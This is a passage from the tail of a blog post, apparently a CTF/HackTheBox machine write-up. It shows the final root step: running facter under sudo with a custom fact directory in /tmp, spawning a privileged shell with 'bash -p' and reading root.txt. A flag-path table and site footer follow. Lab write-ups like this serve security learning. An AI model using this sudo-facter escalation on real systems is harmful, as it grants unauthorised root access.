+trivia@facts:/tmp/exploit$ <span class="token function">sudo</span> /usr/bin/facter --custom-dir<span class="token operator">=</span>/tmp/exploit/ x
+trivia@facts:/tmp/exploit$ <span class="token function">bash</span> <span class="token parameter variable">-p</span>
+bash-5.2<span class="token comment"># cat /root/root.txt</span></code></pre>
+
+
+
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>flag1</td>
+<td>&#x2F;home&#x2F;william&#x2F;user.txt</td>
+</tr>
+<tr>
+<td>flag2</td>
+<td>&#x2F;root&#x2F;root.txt</td>
+</tr>
+</tbody></table>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CVE/" rel="tag"># CVE</a>
+              <a href="/tags/LFI/" rel="tag"># LFI</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/posts/3872553c.html" rel="prev" title="HTB-Imagery">
+                  <i class="fa fa-angle-left"></i> HTB-Imagery
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/posts/6d3db75c.html" rel="next" title="iOS越狱隐藏">
+                  iOS越狱隐藏 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Ry0ma24</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZw==">NexT.Gemini</span> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
